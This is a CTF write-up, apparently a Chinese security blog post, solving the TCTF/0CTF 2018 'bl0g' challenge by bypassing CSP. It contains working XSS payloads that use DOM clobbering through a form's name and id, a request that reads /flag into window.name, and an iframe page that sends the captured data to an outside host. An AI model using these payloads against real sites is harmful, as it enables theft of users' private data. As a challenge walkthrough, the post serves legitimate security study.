---
title: TCTF/0CTF2018 XSS bl0g Writeup
date: 2018-04-05 00:01:03
tags:
- CSP
- xss
---

刚刚过去的TCTF/0CTF2018一如既往的给了我们惊喜，其中最大的惊喜莫过于多道xss中Bypass CSP的题目，其中有很多多应用于现代网站的防御思路，其中的很多利用思路非常精巧，值得研究，所以这里我把xss题目单独出来博文，因为它们值得更多关注！

ps：writeup会在我复现整理完后不断分享出来...

<!--more-->


# bl0g #

```
An extremely secure blog

Just focus on the static files. plz do not use any scanner, or your IP will be blocked.
```

很有趣的题目，整个题的难点在于利用上

站内的功能都是比较常见的xss功能

1、new  新生成文章
2、article/xx 查看文章/评论
3、submit 提交url (start with http://202.120.7.197:8090/)
4、flag admin可以查看到正确的flag

还有一些隐藏的条件

1、CSP

```
Content-Security-Policy:
script-src 'self' 'unsafe-inline'

Content-Security-Policy:
default-src 'none'; script-src 'nonce-hAovzHMfA+dpxVdTXRzpZq72Fjs=' 'strict-dynamic'; style-src 'self'; img-src 'self' data:; media-src 'self'; font-src 'self' data:; connect-src 'self'; base-uri 'none'
```

挺有趣的写法，经过我的测试，两个CSP分开写，是同时生效并且单独生效的，也就是与的关系。

换个说法就是，假设我们通过动态生成script标签的方式，成功绕过了第二个CSP，但我们引入了`<script src="hacker.website">`，就会被第一条CSP拦截，很有趣的技巧。

从CSP我们也可以简单窥得一些利用思路，`base-uri 'none'`代表我们没办法通过修改根域来实现攻击，`default-src 'none'`这其中包含了`frame-src`，这代表攻击方式一定在站内实现，`script-src`的双限制代表我们只能通过`<script>{eval_code}`的方式来实现攻击，让我们接着往下看。

2、new中有一个字段是effect，是设置特效的

```
POST /new HTTP/1.1
Host: 202.120.7.197:8090
Connection: keep-alive
Content-Length: 35
Cache-Control: max-age=0
Origin: http://202.120.7.197:8090
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://202.120.7.197:8090/new
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: BL0G_SID=vV1p59LGb01C4ys4SIFNve4d_upQrCpyykkXWmj4g-i8u2QQzngP5LIW28L0oB1_NB3cJn0TCwjdE32iBt6h

title=a&content=a&effect=nest
```

effect字段会插入到页面中的`<input type="hidden" id="effect" value="{effect_value}">`，但这里实际上是没有任何过滤的，也就是说我们可以通过闭合这个标签并插入我们想要的标签，需要注意的是，这个点只能插入**70个字符**。

3、login?next=这个点可以存在一个任意跳转，通过这个点，我们可以绕过submit的限制（submit的maxlength是前台限制，可以随便跳转

4、站内的特效是通过jqery的append引入的，在article.js这个文件中。

```
$(document).ready(function(){
    $("body").append((effects[$("#effect").val()]));
});
```

effects在config.js中被定义。


回顾上面的几个条件，我们可以简单的整理思路。

**在不考虑0day的情况下，我们唯有通过想办法通过动态生成script标签，通过sd CSP这个点来绕过**

首先我们观察xss点周围的html结构

![image.png-21.3kB][1]

在整站不开启任何缓存的情况下，通过插入标签的方式，唯一存在一种绕过方式就是插入`<script a="`

这种插入方式，如果插入点在一个原页面的script标签前的话，有几率吃掉下一个script标签的nonce属性，举个例子：

```
<script a="
<script nonce="testtt">...

浏览器有一定的容错能力，他会补足不完整的标签
=====>

<script a="<script" nonce="test">...
```

但这个操作在这里并不适用，因为中间过多无用标签，再加上即使吞了也不能有什么办法控制后面的内容，所以这里只有一种绕过方式就是dom xss。

稍微翻翻可以发现，唯一的机会就在这里
```
$(document).ready(function(){
    $("body").append((effects[$("#effect").val()]));
});
```

如果我们可以覆盖effects变量，那我们就可以向body注入标签了，这里需要一点小trick。

**在js中，对于特定的form,iframe,applet,embed,object,img标签，我们可以通过设置id或者name来使得通过id或name获取标签**

也就是说，我们可以通过`effects`获取到`<form name=effects>`这个标签。同理，我们就可以通过插入这个标签来注册effects这个变量。

可如果我们尝试插入这个标签后，我们发现插入的effects在接下来的config.js中被覆盖了。

这时候我们回到刚才提到的特性，**浏览器有一定的容错能力**，我们可以通过插入`<script>`，那么这个标签会自动闭合后面config.js的`</script>`，那么中间的代码就会被视为js代码，被CSP拦截。

![image.png-34.4kB][2]

我们成功的覆盖了effects变量，紧接着我们需要覆盖`effects[$("#effect").val()]`，这里我们选择id属性（这里其实是为了id会使用两次，可以更省位数），

所以我们尝试传入

```
effect=id"><form name=effects id="<script>alert(1)</script>"><script>
```

![image.png-16.9kB][3]

成功执行

接下来的问题就在于怎么构造获取flag了，这里最大的问题在于怎么解决位数不够的问题，我们可以简单计算一下。

上面的payload最简化可以是

```
id"><form name=effects id="<script>"><script>
```

一共有45位，我们可以操作的位数只有25位。在有限的位数下我们需要获取flag页面的内容，并返回回来，我一时间没想到什么好办法。

下面写一种来自@超威蓝猫的解法，非常有趣的思路，payload大概是这样的

[https://blog.cal1.cn/post/0CTF%202018%20Quals%20Bl0g%20writeup](https://blog.cal1.cn/post/0CTF%202018%20Quals%20Bl0g%20writeup)

```
id"><form name=effects id="<script>$.get('/flag',e=>name=e)"><script>
```

通过jquery get获取flag内容，通过箭头函数将返回赋值给`window.name`，紧接着，我们需要想办法获取这里的window.name。

这里用到一个特殊的跨域操作

[http://www.cnblogs.com/zichi/p/4620656.html](http://www.cnblogs.com/zichi/p/4620656.html)

这里用到了一个特殊的特性，就是window.name不跟随域变化而变化，通过window.name我们可以缓存原本的数据。

完整payload
```
<html>
</html>

<script>
var i=document.createElement("iframe");
i.src="http://202.120.7.197:8090/article/3503";
i.id="a";
var state = 0;
document.body.appendChild(i);

i.onload = function (){
	if(state === 1) {
	  	var c = i.contentWindow.name;
	        location.href="http://xx?c="+c;

	} else if(state === 0) {
	  	state = 1;
	  	i.contentWindow.location = './index.html';
	}
}

</script>
```

然后通过`login?next=`这里来跳转到这里，成功理顺

最后分享一个本环境受限的脑洞想法（我觉得蛮有意思的

这个思路受限于当前页面CSP没有`unsafe-eval`，刚才说到`window.name`不随域变化而变化，那么我们传入payload

```
id"><form name=effects id="<script>eval(name)"><script>
```

然后在自己的服务器上设置

```
<script>
window.name="alert(1)";
location.href="{article_url}";
</script>
```

这样我们就能设置window.name了，如果允许eval的话，就可以通过这种方式绕过长度限制。









  [1]: http://static.zybuluo.com/LoRexxar/bz7gl9fs2q89pvezn6xm03xb/image.png
  [2]: http://static.zybuluo.com/LoRexxar/io54g5yal3om63po5w4e9qvn/image.png
  [3]: http://static.zybuluo.com/LoRexxar/4wljy4njhwsq583n1cpz8rvi/image.png
